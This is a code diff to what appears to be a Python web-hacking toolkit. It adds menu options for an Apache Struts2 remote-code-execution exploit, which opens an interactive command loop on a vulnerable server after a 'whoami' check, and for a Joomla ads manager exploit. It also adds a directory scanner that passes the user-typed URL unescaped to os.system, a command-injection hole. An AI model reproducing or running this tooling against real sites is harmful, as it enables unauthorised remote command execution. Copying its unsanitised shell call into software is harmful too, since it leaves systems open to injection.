@@ -1,12 +1,12 @@
 #-*- coding: utf-8 -*-
-from .infoga import infoga as inf
-from .exploit import exploit as exp
-from .scan import scanner as scan
+from .lib.infoga import infoga as inf
+from .lib.exploit import exploit as exp
+from .lib.scan import scanner as scan
 from .core.temp import *
 from requests.exceptions import *
 from .core.helper import Helper as help
 from . import zeeb_mank as zm
-import readline,socket
+import readline,socket,os
 readline.set_pre_input_hook()
 
 campret = '[!] Type "Exit" For Exit from This Tool\n[!] Type "help" for show modules\n'
@@ -171,6 +171,10 @@ class scanners:
           except MissingSchema:
                print(yellow('[!]')+' try start with http:// or https')
 
+      @property
+      def dirhunt(slf):
+          os.system('dirhunt %s ' % (slf.tgt))
+
 
 class exploitation:
 
@@ -251,6 +255,34 @@ class exploitation:
          except MissingSchema:
             print(yellow('[!]')+' try start with http:// or https')
 
+     @property
+     def struts(self):
+         try:
+             ab = exp(self.tgt).struts_rce('whoami')
+             if len(ab) < 20:
+                print(green('[!]')+ ' Vulnerability ')
+                print('Type "exit" for stop')
+                while True:
+                      cmn = str(input('command > '))
+                      if 'exit' in cmn: break
+                      else:exp(self.tgt).struts_rce(cmn)
+             else:
+                print(red('[-]')+'  Not Vulnerability')
+         except ConnectionError:
+            print(red('[x]')+' Internet Connection Error')
+         except MissingSchema:
+            print(yellow('[!]')+' try start with http:// or https')
+
+     @property
+     def joomla_ads_manager(self):
+         try:
+            exp(self.tgt).joomla_ads_manager
+         except ConnectionError:
+            print(red('[x]')+' Internet Connection Error')
+         except MissingSchema:
+            print(yellow('[!]')+' try start with http:// or https')
+
+
 
 
 
@@ -296,6 +328,14 @@ def exploiter():
                  print('\n')
                  exploitation(input('Url : ')).fabrik()
                  print('\n')
+              elif 'apache_struts2_rce' in aex:
+                 print('\n')
+                 exploitation(input('Url : ')).struts
+                 print('\n')
+              elif 'joomla_ads_manager' in aex:
+                 print('\n')
+                 exploitation(input('Url : ')).joomla_ads_manager
+                 print("\n")
               elif 'exit' in aex:
                  exit('Exit !')
               elif 'back' in aex:
@@ -344,6 +384,8 @@ def web_scan():
                  print('\n')
                  scanners(input('URL : ')).admin_page_finder
                  print('\n')
+             elif 'directory_scanner' in jx:
+                 scanners(input('Url : ')).dirhunt
              elif 'exit' in jx:
                  exit('Exit !')
              elif 'back' in jx:
